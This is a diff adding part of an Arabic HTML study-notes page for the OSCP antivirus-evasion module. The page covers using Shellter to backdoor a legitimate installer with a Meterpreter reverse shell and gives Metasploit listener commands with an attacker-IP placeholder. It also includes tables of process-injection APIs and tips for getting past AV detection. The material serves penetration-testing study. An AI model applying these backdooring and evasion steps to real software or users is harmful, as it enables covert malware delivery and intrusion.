+<p>Shellter بتطلب مسار الملف → بتحلّله → بتعمل Backup قبل التعديل.</p>
+
+<h3>Stealth Mode وإعداد الـ Payload</h3>
+<p>لما Shellter بتلاقي نقطة Injection مناسبة، بتسألك عن تفعيل <strong>Stealth Mode</strong>:</p>
+<ul>
+  <li>البرنامج الأصلي بيكمّل تنفيذه بشكل طبيعي بعد تفعيل الـ Payload</li>
+  <li>Spotify Installer مثلاً بيكمّل عرض نافذة التثبيت الطبيعية</li>
+  <li>ده بيقلل الشك لدى المستخدم بشكل كبير</li>
+</ul>
+
+<h3>اختيار الـ Payload وإعداد الـ Listener</h3>
+<div class="table-wrap"><table>
+<thead><tr><th>الخطوة</th><th>التفاصيل</th></tr></thead>
+<tbody>
+<tr><td>اختيار الـ Payload</td><td>Meterpreter Reverse TCP (الأكثر موثوقية على Windows 11)</td></tr>
+<tr><td>LHOST</td><td>IP جهاز المهاجم (يستقبل الاتصال)</td></tr>
+<tr><td>LPORT</td><td>البورت الذي سيستمع عليه الـ Handler</td></tr>
+<tr><td>نتيجة الـ Injection</td><td>ملف PE يبدو شرعياً لكنه يحمل Meterpreter مضمَّن</td></tr>
+</tbody>
+</table></div>
+<div class="code-wrap"><span class="code-tag">metasploit — listener setup</span><pre><code>use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST &lt;Attacker_IP&gt;
+set LPORT &lt;Port&gt;
+run
+</code></pre></div>
+
+<h3>Shellter Workflow — رسم تخطيطي</h3>
+<div class="diagram-card">
+<svg viewBox="0 0 700 170" xmlns="http://www.w3.org/2000/svg">
+  <!-- Legitimate PE -->
+  <rect x="8" y="55" width="120" height="60" rx="6" class="dsvg-box-g"/>
+  <text x="68" y="78" text-anchor="middle" class="dsvg-green" font-size="10" font-weight="700">Legitimate</text>
+  <text x="68" y="93" text-anchor="middle" class="dsvg-green" font-size="10" font-weight="700">PE File</text>
+  <text x="68" y="108" text-anchor="middle" class="dsvg-muted" font-size="9">spotify.exe</text>
+
+  <line x1="128" y1="85" x2="158" y2="85" class="dsvg-line"/>
+  <polygon points="158,80 168,85 158,90" class="dsvg-arr"/>
+
+  <!-- Shellter box -->
+  <rect x="168" y="30" width="140" height="110" rx="8" class="dsvg-box"/>
+  <text x="238" y="52" text-anchor="middle" class="dsvg-txt" font-size="10" font-weight="700">SHELLTER</text>
+  <text x="238" y="70" text-anchor="middle" class="dsvg-muted" font-size="9">① Deep PE Analysis</text>
+  <text x="238" y="87" text-anchor="middle" class="dsvg-muted" font-size="9">② Find Injection Points</text>
+  <text x="238" y="104" text-anchor="middle" class="dsvg-muted" font-size="9">③ IAT Reuse</text>
+  <text x="238" y="121" text-anchor="middle" class="dsvg-muted" font-size="9">④ Stealth Mode</text>
+
+  <!-- Payload config coming in from below -->
+  <rect x="178" y="155" width="120" height="12" rx="3" class="dsvg-box-a"/>
+  <text x="238" y="165" text-anchor="middle" class="dsvg-amber" font-size="8">LHOST + LPORT + Payload</text>
+  <line x1="238" y1="155" x2="238" y2="140" class="dsvg-line" stroke-dasharray="3,2"/>
+
+  <line x1="308" y1="85" x2="338" y2="85" class="dsvg-line"/>
+  <polygon points="338,80 348,85 338,90" class="dsvg-arr"/>
+
+  <!-- Backdoored PE -->
+  <rect x="348" y="55" width="130" height="60" rx="6" class="dsvg-box-r"/>
+  <text x="413" y="78" text-anchor="middle" class="dsvg-red" font-size="10" font-weight="700">Backdoored</text>
+  <text x="413" y="93" text-anchor="middle" class="dsvg-red" font-size="10" font-weight="700">PE File</text>
+  <text x="413" y="108" text-anchor="middle" class="dsvg-muted" font-size="9">looks normal ✓</text>
+
+  <line x1="478" y1="85" x2="508" y2="85" class="dsvg-line"/>
+  <polygon points="508,80 518,85 508,90" class="dsvg-arr"/>
+
+  <!-- Execution -->
+  <rect x="518" y="55" width="170" height="60" rx="6" class="dsvg-box-p"/>
+  <text x="603" y="75" text-anchor="middle" font-size="10" font-weight="700" style="fill:var(--purple)">Target Runs File</text>
+  <text x="603" y="92" text-anchor="middle" class="dsvg-muted" font-size="9">Spotify installs normally</text>
+  <text x="603" y="108" text-anchor="middle" font-size="9" style="fill:var(--purple)">+ Reverse Shell opens</text>
+</svg>
+<div class="diagram-caption">Shellter تحوّل ملفاً شرعياً لـ Backdoor مع الحفاظ على وظيفته الأصلية</div>
+</div>
+
+<div class="callout examtip">
+<div class="callout-label">★ Key Takeaways — Shellter</div>
+<p>الأدوات الآلية تقدر تتجاوز الكشف القائم على التوقيعات ← البرامج الشرعية يمكن تسليحها ← Stealth Mode بيحافظ على سلوك طبيعي للبرنامج ← إعداد الـ Listener ضروري قبل تشغيل الملف المصاب ← هذه التقنيات شائعة في حملات الـ Phishing واختبارات الاختراق المستهدَفة.</p>
+</div>
+
+<hr />
+
+<!-- ═══════════════════════════════════════════════════ CHEAT SHEET -->
+<h2 id="cheat"><span class="htext">Cheat Sheet مرجعي</span></h2>
+<div class="cheat-section">
+
+<h4>أساليب الكشف — مقارنة سريعة</h4>
+<div class="table-wrap"><table>
+<thead><tr><th>الأسلوب</th><th>المبدأ</th><th>نقاط القوة</th><th>نقاط الضعف</th></tr></thead>
+<tbody>
+<tr><td><code>Signature-Based</code></td><td>مطابقة البصمات والـ Hashes</td><td>سريع، دقيق للتهديدات المعروفة</td><td>عاجز ضد تهديدات جديدة أو معدَّلة</td></tr>
+<tr><td><code>Heuristic</code></td><td>تحليل بنية الكود والمنطق</td><td>يكتشف Variants جديدة</td><td>False Positives أعلى</td></tr>
+<tr><td><code>Behavior Monitoring</code></td><td>مراقبة أفعال البرنامج في Sandbox</td><td>فعّال ضد المشفَّر والمعتَّم</td><td>قابل للتخطّي بـ Anti-Sandbox</td></tr>
+<tr><td><code>ML / AI</code></td><td>تعلّم من Patterns وخصائص</td><td>يكتشف تهديدات غير معروفة</td><td>يحتاج اتصال سحابي — ضعيف في الشبكات المعزولة</td></tr>
+</tbody>
+</table></div>
+
+<h4>محركات الـ AV السبعة — مرجع سريع</h4>
+<div class="table-wrap"><table>
+<thead><tr><th>المحرك</th><th>الوظيفة الأساسية</th><th>يكتشف</th></tr></thead>
+<tbody>
+<tr><td>File Analysis</td><td>فحص دوري ومراقبة لحظية للملفات</td><td>Malware على القرص</td></tr>
+<tr><td>Memory Inspection</td><td>فحص الذاكرة الحية للعمليات</td><td>Fileless Malware و Code Injection</td></tr>
+<tr><td>Network Monitoring</td><td>مراقبة الترافيك الشبكي</td><td>C2 Communications و Data Exfiltration</td></tr>
+<tr><td>Code Analysis</td><td>Disassembly وتحليل الكود</td><td>Packers و Obfuscators و Decryption Stubs</td></tr>
+<tr><td>Sandbox / Emulator</td><td>تشغيل آمن في بيئة معزولة</td><td>Encrypted Malware والـ Behavior الخبيث</td></tr>
+<tr><td>Browser Extension</td><td>مراقبة Scripts والتنزيلات</td><td>Web-based threats و Drive-by Downloads</td></tr>
+<tr><td>AI / ML Module</td><td>تحليل Patterns سحابي/محلي</td><td>Unknown Threats و Zero-days</td></tr>
+</tbody>
+</table></div>
+
+<h4>On-Disk vs In-Memory — مقارنة شاملة</h4>
+<div class="table-wrap"><table>
+<thead><tr><th>المعيار</th><th>On-Disk Evasion</th><th>In-Memory Evasion</th></tr></thead>
+<tbody>
+<tr><td>الأثر الجنائي</td><td>ملف معدَّل على القرص</td><td>RAM فقط — يختفي بعد Reboot</td></tr>
+<tr><td>الاستمرارية</td><td>ممكن (الملف باقي)</td><td>مؤقت (Volatile)</td></tr>
+<tr><td>احتمال الكشف</td><td>أعلى</td><td>أقل (ضد File Scanners)</td></tr>
+<tr><td>الأساليب الرئيسية</td><td>Packers, Obfuscation, Crypters</td><td>Process Injection, Hollowing, Hooking</td></tr>
+<tr><td>الصعوبة التقنية</td><td>أسهل نسبياً</td><td>أصعب — يتطلب Windows API knowledge</td></tr>
+</tbody>
+</table></div>
+
+<h4>Windows APIs المستخدَمة في Thread Injection</h4>
+<div class="table-wrap"><table>
+<thead><tr><th>API</th><th>المعامل الرئيسي</th><th>الوظيفة</th></tr></thead>
+<tbody>
+<tr><td><code>VirtualAlloc()</code></td><td>PAGE_EXECUTE_READWRITE</td><td>حجز ذاكرة قابلة للقراءة والكتابة والتنفيذ</td></tr>
+<tr><td><code>memset()</code></td><td>Shellcode bytes, length</td><td>كتابة bytes الـ Shellcode في المساحة المحجوزة</td></tr>
+<tr><td><code>CreateThread()</code></td><td>lpStartAddress = pointer to shellcode</td><td>إنشاء Thread جديد يبدأ تنفيذه من الـ Shellcode</td></tr>
+<tr><td><code>VirtualAllocEx()</code></td><td>hProcess = target process handle</td><td>نفس VirtualAlloc لكن في عملية خارجية</td></tr>
+<tr><td><code>WriteProcessMemory()</code></td><td>hProcess, lpBaseAddress</td><td>الكتابة في ذاكرة عملية خارجية</td></tr>
+<tr><td><code>CreateRemoteThread()</code></td><td>hProcess, lpStartAddress</td><td>Remote Process Injection — Thread في عملية خارجية</td></tr>
+</tbody>
+</table></div>
+
+<h4>أوامر تثبيت Shellter على Kali</h4>
+<div class="table-wrap"><table>
+<thead><tr><th>الأمر</th><th>الوظيفة</th></tr></thead>
+<tbody>
+<tr><td><code>apt-cache search shellter</code></td><td>البحث عن حزمة Shellter</td></tr>
+<tr><td><code>sudo apt install shellter</code></td><td>تثبيت Shellter</td></tr>
+<tr><td><code>sudo apt install wine</code></td><td>تثبيت Wine (لتشغيل أدوات Windows على Linux)</td></tr>
+<tr><td><code>dpkg --add-architecture i386</code></td><td>إضافة دعم معمارية 32-bit</td></tr>
+<tr><td><code>apt-get update</code></td><td>تحديث قاعدة بيانات الحزم</td></tr>
+<tr><td><code>apt-get install wine32</code></td><td>تثبيت Wine 32-bit (مطلوب لـ Shellter)</td></tr>
+</tbody>
+</table></div>
+
+<h4>PowerShell Execution Policies — مرجع سريع</h4>
+<div class="table-wrap"><table>
+<thead><tr><th>السياسة</th><th>السلوك</th><th>ملاحظة</th></tr></thead>
+<tbody>
+<tr><td><code>Restricted</code></td><td>يمنع كل Scripts</td><td>الافتراضي في معظم أنظمة Windows</td></tr>
+<tr><td><code>RemoteSigned</code></td><td>Scripts محلية مسموحة — البُعدية تحتاج توقيع</td><td>شائع في بيئات الشركات</td></tr>
+<tr><td><code>Unrestricted</code></td><td>كل Scripts مسموحة مع تحذير للبُعدية</td><td>تحذير قابل للتجاوز</td></tr>
+<tr><td><code>Bypass</code></td><td>لا قيود ولا تحذيرات</td><td>الأنسب لبيئات الاختبار المتحكَّم فيها</td></tr>
+</tbody>
+</table></div>
+
+<h4>فحوصات سريعة لـ AV Evasion فاشل</h4>
+<div class="table-wrap"><table>
+<thead><tr><th>العَرَض</th><th>الفحص الأول</th></tr></thead>
+<tbody>
+<tr><td>AV عزل الملف فوراً</td><td>جرّب Obfuscation — غيّر أسماء المتغيّرات والـ Strings المميّزة</td></tr>
+<tr><td>كشف الـ Memory Module</td><td>جرّب Process Injection في عملية أكثر شرعية (explorer.exe)</td></tr>
+<tr><td>Sandbox اكتشف السلوك</td><td>أضف Anti-Sandbox check أو تأخير في التنفيذ</td></tr>
+<tr><td>ML اكتشف الـ Payload</td><td>استخدم Custom Shellcode بدل Metasploit templates الشائعة</td></tr>
+<tr><td>VirusTotal نسبة كشف عالية</td><td>لا تستخدم VirusTotal في Engagements حقيقية — جهّز Lab VM</td></tr>
+</tbody>
+</table></div>
+
+</div>
+
+<hr />
+
+<!-- ═══════════════════════════════════════════════════ SUMMARY -->
+<h2 id="summary"><span class="htext">الخلاصة العامة للموديول</span></h2>
+<p>في الموديول ده، استعرضنا بنية برامج مكافحة الفيروسات من الداخل — كيف بتعمل، إيه المحركات اللي بتتعاون مع بعض، وإزاي بتقرّر إيه اللي آمن وإيه اللي خبيث. بعد كده انتقلنا لأساليب التحايل اللي بيعتمد عليها مختبرو الاختراق في التقييمات المرخَّصة.</p>
+
+<div class="takeaways">
+<div class="takeaways-title">$ cat ./module12_summary.txt</div>
+<ul>
+<li>الـ AV الحديث بيجمع 7 محركات متكاملة: File, Memory, Network, Code Analysis, Sandbox, Browser, AI/ML</li>
+<li>أساليب الكشف الأربعة (Signature, Heuristic, Behavior, ML) بتكمّل بعضها — مفيش واحد كافي لوحده</li>
+<li>الـ On-Disk Evasion (Packers, Obfuscation, Crypters) بقى أصعب مع تطوّر الكشف السلوكي والـ ML</li>
+<li>الـ In-Memory Evasion أكثر فاعلية ضد File Scanners — بس يحتاج معرفة تقنية أعمق بـ Windows APIs</li>
+<li>Thread Injection بـ PowerShell: VirtualAlloc → memset → CreateThread — كل الكود في RAM فقط</li>
+<li>Shellter بتأتمت الـ Injection في ملفات شرعية بإعادة استخدام IAT وتجنّب Section Modifications</li>
+<li>ما ترفعش أدوات الـ Engagement على VirusTotal — استخدم Lab VM يطابق بيئة الهدف</li>
+<li>الـ Custom Tooling أصعب كشفاً بكتير من الأدوات المعروفة ذات التوقيعات الموجودة مسبقاً</li>
+</ul>
+</div>
+
+<blockquote>
+<p><strong>الفرق بين مختبر الاختراق الجيد والممتاز هو الفهم العميق للجانبين — الهجوم والدفاع معاً.</strong> فهم كيف الـ AV بيشتغل من جوه بيسمحلك بتقييم واقعي لمدى صلابة الدفاعات وتقديم توصيات حقيقية تحمي العميل من التهديدات المتقدّمة.</p>
+</blockquote>
+
+<div class="callout examtip">
+<div class="callout-label">★ Professional Mindset</div>
+<p>لما محاولة التحايل تفشل: حدّد أي محرك اكتشف الـ Payload ← افهم إيه النمط اللي كشفه ← راجع ما إذا كان Disk-based أو Memory-based أو Behavioral ← عدّل الأسلوب أو الـ Payload ← اختبر في Lab معزول ← لا ترفع على منصات عامة ← وثّق كل خطوة وكل تعديل.</p>
+</div>
+
+<hr />
+<p><em>نهاية نوتس الموديول الثاني عشر — OSCP: Antivirus Evasion</em></p>
+<div class="footer-note">-- EOF: module-12/antivirus-evasion.md --</div>
+
+</div>
+
+<script>
+(function(){
+  var root = document.documentElement;
+  var btn = document.getElementById('themeSwitch');
+  function applyTheme(t){
+    root.setAttribute('data-theme', t);
+    btn.textContent = 'theme: ' + t;
+    try{ localStorage.setItem('oscp-notes-theme', t); }catch(e){}
+  }
+  var saved = 'dark';
+  try{ saved = localStorage.getItem('oscp-notes-theme') || 'dark'; }catch(e){}
+  applyTheme(saved);
+  btn.addEventListener('click', function(){
+    applyTheme(root.getAttribute('data-theme') === 'dark' ? 'light' : 'dark');
+  });
+
+  var bar = document.getElementById('progressBar');
+  function onScroll(){
+    var h = document.documentElement;
+    var scrolled = h.scrollTop;
+    var height = h.scrollHeight - h.clientHeight;
+    bar.style.width = (height > 0 ? (scrolled/height*100) : 0) + '%';
+    var toTop = document.getElementById('toTop');
+    if(scrolled > 500){ toTop.classList.add('show'); } else { toTop.classList.remove('show'); }
+  }
+  document.addEventListener('scroll', onScroll);
+  onScroll();
+  document.getElementById('toTop').addEventListener('click', function(){
+    window.scrollTo({top:0, behavior:'smooth'});
+  });
+
+  document.querySelectorAll('.code-wrap').forEach(function(wrap){
+    var codeEl = wrap.querySelector('code');
+    if(!codeEl) return;
+    var b = document.createElement('button');
+    b.className = 'copy-btn';
+    b.textContent = 'copy';
+    b.addEventListener('click', function(){
+      var text = codeEl.innerText;
+      if(navigator.clipboard){
+        navigator.clipboard.writeText(text).then(function(){
+          b.textContent = 'copied ✓';
+          b.classList.add('copied');
+          setTimeout(function(){ b.textContent = 'copy'; b.classList.remove('copied'); }, 1500);
+        });
+      }
+    });
+    wrap.appendChild(b);
+  });
+})();
+</script>
+
+</body>
+</html>
